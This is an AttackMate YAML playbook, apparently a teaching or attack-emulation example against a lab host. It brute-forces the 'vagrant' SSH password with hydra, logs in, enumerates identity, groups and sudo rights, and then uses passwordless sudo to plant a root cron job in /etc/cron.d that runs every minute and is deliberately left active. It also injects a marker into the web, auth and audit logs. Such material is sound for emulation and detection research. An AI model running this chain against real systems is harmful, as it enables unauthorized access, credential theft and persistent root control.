#
# Author: AttackMate Persistence experiment (MIRANDA teaching example)
# Description:
#     Persistence by a SCHEDULED CRON JOB. hydra brute-forces vagrant's SSH password; we
#     log in and enumerate (id, uname, /etc/group, sudo -l), then drop a root job into
#     /etc/cron.d that fires every minute. Left active (no reversal); the marker is
#     embedded in the cron payload so every future root cron execve carries it.
#     vagrant's NOPASSWD sudo does the drop.
#
#     Tactic flow: Credential Access -> Initial Access -> Discovery -> Persistence
#     (Defense Evasion runs throughout: the log-injection marker rides every step.)
#
# AUTHORIZED USE ONLY:
#     Run this only against systems you own or have explicit written permission to test.
#
vars:
  TARGET: 172.28.128.3
  BRUTE_USER: vagrant
  PASSWDLIST: ~/tmp/passwd          # pre-existing wordlist on the op host (must contain 'vagrant')
  # Log-injection marker. Space-free single token: auditd hex-encodes any argv that contains
  # a space, which would break the marker join across the access.log / auth.log / auditd layers.
  INJECTION: "this_is_the_injection"

commands:

  # ===================== Phase A: operator-side prep =====================
  - type: shell
    cmd: "mkdir -p /tmp/persist_cron"
    metadata:
      description: "Stage a local directory on the operator host to collect proof/output"

  # ===================== Phase 0: pre-exploit log poisoning =====================
  - type: http-client
    cmd: GET
    url: http://$TARGET/?probe=1
    useragent: "$INJECTION"
    exit_on_error: False
    metadata:
      description: "Benign-looking GET whose User-Agent seeds the marker into the Apache access log"
      techniques: "T1562.006"
      tactics: "Defense Evasion"

  - type: sleep
    seconds: 4
    min_sec: 1
    random: True
    metadata:
      description: "Human-paced jitter between the two probes"

  - type: ssh
    cmd: id
    username: "$INJECTION"
    password: "x"
    hostname: $TARGET
    interactive: False
    exit_on_error: False
    metadata:
      description: "Bogus SSH username injection -> poisons auth.log (Invalid user ...)"
      techniques: "T1110.001,T1562.006"
      tactics: "Credential Access,Defense Evasion"

  # ===================== Phase 1: Credential Access (SSH brute force) =====================
  - type: shell
    cmd: hydra -l $BRUTE_USER -P $PASSWDLIST ssh://$TARGET
    metadata:
      description: "Brute-force the SSH password with hydra"
      techniques: "T1110.001"
      tactics: "Credential Access"

  - type: setvar
    variable: CRACKED
    cmd: "PARSE_FAILED"
    metadata:
      description: "Pre-seed the cracked-password variable so a parse failure is detectable"
      techniques: "T1110.001"
      tactics: "Credential Access"

  - type: regex
    input: RESULT_STDOUT
    cmd: "login:\\s+$BRUTE_USER\\s+password:\\s+(\\S+)"
    mode: findall
    output:
      CRACKED: "$MATCH_0"
    metadata:
      description: "Parse the cracked SSH password from the hydra output"
      techniques: "T1110.001"
      tactics: "Credential Access"

  - type: debug
    cmd: "Cracked SSH password for $BRUTE_USER: $CRACKED"
    metadata:
      description: "Print the cracked credential (PARSE_FAILED means hydra did not crack it)"

  - type: ssh
    cmd: "bash -c 'id' \"$INJECTION\""
    username: $BRUTE_USER
    password: "$CRACKED"
    hostname: $TARGET
    interactive: False
    creates_session: "foothold"
    metadata:
      description: "Log in over SSH using the brute-forced password; execve poisoned with the marker"
      techniques: "T1078,T1021.004,T1033,T1562.006"
      tactics: "Initial Access,Lateral Movement,Discovery,Defense Evasion"

  - type: sleep
    min_sec: 2
    seconds: 6
    random: True
    metadata:
      description: "Operator-side think time before enumeration (human pacing)"

  # ===================== Phase 2: Discovery / enumeration =====================
  - type: ssh
    cmd: "bash -c 'id' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    save: /tmp/persist_cron/disc_01_id.txt
    metadata:
      description: "Current identity (expect vagrant); execve poisoned with the marker"
      techniques: "T1033,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: ssh
    cmd: "bash -c 'uname -a' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    save: /tmp/persist_cron/disc_02_uname.txt
    metadata:
      description: "Kernel name/version/arch; execve poisoned with the marker"
      techniques: "T1082,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: ssh
    cmd: "bash -c 'cat /etc/group' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    save: /tmp/persist_cron/disc_03_group.txt
    metadata:
      description: "Local groups and members (sudo/docker rosters); execve poisoned with the marker"
      techniques: "T1069.001,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: ssh
    cmd: "bash -c 'sudo -n -l 2>/dev/null' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    save: /tmp/persist_cron/disc_04_sudo.txt
    metadata:
      description: "List sudo privileges without a password (expect NOPASSWD ALL); execve poisoned with the marker"
      techniques: "T1069.001,T1033,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: debug
    cmd: "[cron] sudo -l (expect vagrant NOPASSWD: ALL) -> $RESULT_STDOUT"
    metadata:
      description: "Surface the sudo rules inline (the root path for the persistence step)"
      techniques: "T1069.001"
      tactics: "Discovery"

  - type: sleep
    min_sec: 2
    seconds: 6
    random: True
    metadata:
      description: "Operator-side think time before planting persistence (human pacing)"

  # ===================== Persistence: Scheduled Task: Cron (T1053.003), LEFT ACTIVE =====================
  # Clean double-quoted echo form: the single quotes wrap the inner bash -c payload; no $ expands
  # except $INJECTION which AttackMate substitutes to the marker BEFORE the shell runs. Left
  # UNWRAPPED (the drop itself). Future root cron execve carries a3=this_is_the_injection.
  - type: ssh
    cmd: "echo \"* * * * * root /bin/bash -c '/bin/touch /tmp/persist_cron_marker' $INJECTION\" | sudo -n tee /etc/cron.d/persist_demo >/dev/null"
    session: "foothold"
    interactive: False
    exit_on_error: False
    metadata:
      description: "Install a system cron job for persistence; marker embedded in the payload"
      techniques: "T1053.003,T1562.006"
      tactics: "Persistence,Defense Evasion"

  - type: ssh
    cmd: "bash -c 'sudo -n cat /etc/cron.d/persist_demo' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    save: /tmp/persist_cron/persist_proof.txt
    metadata:
      description: "Show the installed cron job (detection artefact); execve poisoned with the marker"
      techniques: "T1053.003,T1562.006"
      tactics: "Persistence,Defense Evasion"

  - type: debug
    cmd: "[cron] complete -> LEFT ACTIVE: /etc/cron.d/persist_demo (fires every minute as root) -> $RESULT_STDOUT"
    metadata:
      description: "Surface the installed cron job inline (no reversal, no wait - left active)"
      techniques: "T1053.003"
      tactics: "Persistence"
